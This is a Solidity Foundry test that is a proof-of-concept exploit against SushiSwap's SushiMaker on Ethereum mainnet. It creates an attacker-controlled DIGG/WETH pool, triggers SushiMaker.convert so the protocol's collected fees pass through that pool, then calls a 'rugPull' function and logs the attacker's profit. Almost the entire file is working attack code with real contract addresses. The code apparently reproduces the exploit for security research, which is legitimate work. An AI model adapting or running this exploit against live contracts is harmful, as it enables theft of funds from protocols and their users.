// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@forge-std/Test.sol";
import "@forge-std/Vm.sol";
import "@forge-std/console.sol";
import "../src/SushiBadgerDigg.sol";
import "interfaces/IWETH.sol";
import "interfaces/SushiMaker.sol";

contract FuseAttackPoC is Test {
    SushiAttacker sushiAttack = new SushiAttacker(
        IUniswapV2Router02(address(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F)),
        IUniswapV2Factory(address(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac)));

    IUniswapV2Pair diggWBTCPair = IUniswapV2Pair(0x9a13867048e01c663ce8Ce2fE0cDAE69Ff9F35E3);
    IUniswapV2Factory sushiFactory = IUniswapV2Factory(address(sushiAttack.sushiFactory()));
    IWETH weth = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    SushiMaker sushiMaker = SushiMaker(0xE11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50);

    // EOA address
    address constant myAddress = address(1337);

    function setUp() public {
        vm.deal(myAddress, 1 ether);
        vm.label(address(myAddress), "Attacker Address");
    }

    function testSushiAttack() public {
        vm.startPrank(myAddress, myAddress); //msg.sender and tx.origin 
        IERC20 wbtc = IERC20(diggWBTCPair.token0());
        IERC20 digg = IERC20(diggWBTCPair.token1());

        sushiAttack.createAndProvideLiquidity{value:0.001 ether}(wbtc, digg);
        //This is the pair that was just created by the attacker.
        IUniswapV2Pair diggWETHPair = IUniswapV2Pair(sushiFactory.getPair(address(weth), address(digg)));
        (uint112 reserveDigg, uint112 reserveWeth,) = diggWETHPair.getReserves();

        uint256 lpBalance = diggWETHPair.balanceOf(address(sushiAttack));
        uint256 initialBalance = address(myAddress).balance;
        emit log_named_address("Fees are sent to", sushiFactory.feeTo());
        emit log_named_address("Bridge for WBTC", sushiMaker.bridgeFor(address(wbtc)));
        emit log_named_address("Bridge for DIGG", sushiMaker.bridgeFor(address(digg)));

        emit log_named_uint("ETH Balance in gwei", initialBalance / 1 gwei);
        emit log_named_address("Digg/WETH Pair Address", address(diggWETHPair));
        emit log_named_uint("Reserves of DIGG in DIGG/WETH pair", reserveDigg);
        emit log_named_uint("Reserves of WETH in DIGG/WETH pair", reserveWeth);
        emit log_named_uint("LP balance", lpBalance);

        // Make a trade
        sushiMaker.convert(address(wbtc),address(digg));
        (uint112 reserveDigg1, uint112 reserveWeth1,) = diggWETHPair.getReserves();
        uint256 lpBalance1 = diggWETHPair.balanceOf(address(sushiAttack));

        emit log_named_uint("ETH Balance", address(myAddress).balance / 1 ether);
        emit log_named_uint("Reserves of Digg", reserveDigg1);
        emit log_named_uint("Reserves of WETH", reserveWeth1);
        emit log_named_uint("LP balance", lpBalance1);

        sushiAttack.rugPull(diggWETHPair, wbtc);

        (uint112 reserveDigg2, uint112 reserveWeth2,) = diggWETHPair.getReserves();
        uint256 lpBalance2 = diggWETHPair.balanceOf(address(sushiAttack));

        emit log_named_uint("ETH Balance", address(myAddress).balance / 1 ether);
        emit log_named_uint("Reserves of Digg", reserveDigg2);
        emit log_named_uint("Reserves of WETH", reserveWeth2);
        emit log_named_uint("LP Balance", lpBalance2);
        uint profit = (address(myAddress).balance - initialBalance);
        emit log_named_uint("Total profit", profit);
        vm.stopPrank();
        assert(true);
    }
}